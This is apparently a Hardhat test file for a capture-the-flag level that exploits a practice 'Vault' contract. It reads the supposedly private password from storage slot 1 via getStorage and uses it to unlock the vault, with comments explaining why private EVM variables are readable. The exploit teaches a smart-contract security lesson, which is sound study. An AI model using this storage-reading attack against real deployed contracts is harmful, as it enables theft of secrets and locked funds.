import {loadFixture} from "@nomicfoundation/hardhat-toolbox/network-helpers"
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Level 08 - Vault contract hack", () => {
    async function setUp() {
        const [owner, hacker] = await ethers.getSigners();

        const password = ethers.encodeBytes32String("password to be cracked"); // Formerly ethers.utils.formatBytes32String();

        const VaultContract = await ethers.getContractFactory("Vault");
        const vault = await VaultContract.deploy(password);

        return {owner, hacker, vault};
    };
    
    describe("When hacking", () => {
        it("Hacker should be able to read the private password variable and unlock it", async() => {
            /*
             * EVM contracts are not meant to hold sensitive information!
             * Private variables are only private in the execution context of the smart contracts.
             * This means that the information they hold can be read by means of off-chain calls.
             * 
             * For instance, the ethers getStorage() method receives the contract address and the storage location
             * and returns the value it holds.
             * 
             * By reading from the proper smart contract storage slot, the hacker can check the current password and unlock it. 
            **/
            const {owner, hacker, vault} = await loadFixture(setUp);

            expect(await vault.locked()).to.equal(true);
            const passwordRetrieved = await ethers.provider.getStorage(await vault.getAddress(), 1);

            await vault.connect(hacker).unlock(passwordRetrieved);
            expect(await vault.locked()).to.equal(false);
        });
    });
});